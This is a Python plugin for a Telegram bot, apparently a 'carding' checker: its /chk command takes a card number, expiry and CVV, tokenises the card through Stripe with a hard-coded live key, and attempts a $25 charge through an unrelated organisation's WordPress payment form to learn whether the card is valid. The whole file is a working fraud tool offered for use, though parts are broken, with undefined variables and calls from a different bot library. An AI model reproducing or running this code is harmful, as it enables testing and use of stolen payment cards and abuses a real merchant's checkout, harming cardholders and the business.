from pyrogram import Client, filters, types
import re
import time
from DAXXMUSIC import app
from config import BOT_USERNAME



@app.on_message(filters.command('chk'))
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('chk', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/chk '):]

        if len(cc) == 0:
            return await message.reply("<b>No Card to chk</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>Failed to parse Card</b>\n'
                                       '<b>Reason: Invalid Format!</b>')   
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        # get guid muid sid
        headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

        # b = session.get('https://ip.seeip.org/', proxies=proxies).text

        s = session.post('https://m.stripe.com/6', headers=headers)
        r = s.json()
        Guid = r['guid']
        Muid = r['muid']
        Sid = r['sid']

        postdata = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

        HEADER = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": UA,
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
        }

        pr = session.post('https://api.stripe.com/v1/tokens',
                          data=postdata, headers=HEADER)
        Id = pr.json()['id']

        # hmm
        load = {
            "action": "wp_full_stripe_payment_charge",
            "formName": "BanquetPayment",
            "fullstripe_name": Name,
            "fullstripe_email": Email,
            "fullstripe_custom_amount": "25.0",
            "fullstripe_amount_index": 0,
            "stripeToken": Id
        }

        header = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": UA,
            "origin": "https://archiro.org",
            "referer": "https://archiro.org/banquet/",
            "accept-language": "en-US,en;q=0.9"
        }

        rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
                          data=load, headers=header)
        msg = rx.json()['msg']

        toc = time.perf_counter()

        if 'true' in rx.text:
            return await message.reply(f'''
๏ ✅<b>ᴄᴄ</b>➛ <code>{ccn}|{mm}|{yy}|{cvv}</code>
๏ <b>sᴛᴀᴛᴜs</b>➛ #ᴄʜᴀʀɢᴇᴅ 25$
๏ <b>ᴍsɢ</b>➛ {msg}
๏ <b>ᴛᴏᴏᴋ</b>➛ <code>{toc - tic:0.2f}</code>(s)
๏ <b>ᴄʜᴋ ʙʏ</b>➛ <a href="tg://user?id={ID}">{FIRST}</a>
๏ <b>ᴏᴡɴᴇʀ</b>➛ {await is_owner(ID)}
๏ <b>ʙᴏᴛ</b>➛ @{BOT_USERNAME}''')

        if 'security code' in rx.text:
            return await message.reply(f'''
๏ ✅<b>ᴄᴄ</b>➛ <code>{ccn}|{mm}|{yy}|{cvv}</code>
๏ <b>sᴛᴀᴛᴜs</b>➛ #ᴄᴄɴ
๏ <b>ᴍsɢ</b>➛ {msg}
๏ <b>ᴛᴏᴏᴋ</b>➛ <code>{toc - tic:0.2f}</code>(s)
๏ <b>ᴄʜᴋ ʙʏ</b>➛ <a href="tg://user?id={ID}">{FIRST}</a>
๏ <b>ᴏᴡɴᴇʀ</b>➛ {await is_owner(ID)}
๏ <b>ʙᴏᴛ</b>➛ @{BOT_USERNAME}''')

        if 'false' in rx.text:
            return await message.reply(f'''
๏ ❌<b>ᴄᴄ</b>➛ <code>{ccn}|{mm}|{yy}|{cvv}</code>
๏ <b>sᴛᴀᴛᴜs</b>➛ #ᴅᴇᴄʟɪɴᴇᴅ
๏ <b>ᴍsɢ</b>➛ {msg}
๏ <b>ᴛᴏᴏᴋ</b>➛ <code>{toc - tic:0.2f}</code>(s)
๏ <b>ᴄʜᴋ ʙʏ</b>➛ <a href="tg://user?id={ID}">{FIRST}</a>
๏ <b>ᴏᴡɴᴇʀ</b>➛ {await is_owner(ID)}
๏ <b>ʙᴏᴛ</b>➛ @{BOT_USERNAME}''')

        await message.reply(f'''
๏ ❌<b>ᴄᴄ</b>➛ <code>{ccn}|{mm}|{yy}|{cvv}</code>
๏ <b>sᴛᴀᴛᴜs</b>➛ ᴅᴇᴀᴅ
๏ <b>ᴍsɢ</b>➛ {rx.text}
๏ <b>ᴛᴏᴏᴋ</b>➛ <code>{toc - tic:0.2f}</code>(s)
๏ <b>ᴄʜᴋ ʙʏ</b>➛ <a href="tg://user?id={ID}">{FIRST}</a>
๏ <b>ᴏᴡɴᴇʀ</b>➛ {await is_owner(ID)}
๏ <b>ʙᴏᴛ</b>➛ @{BOT_USERNAME}''')
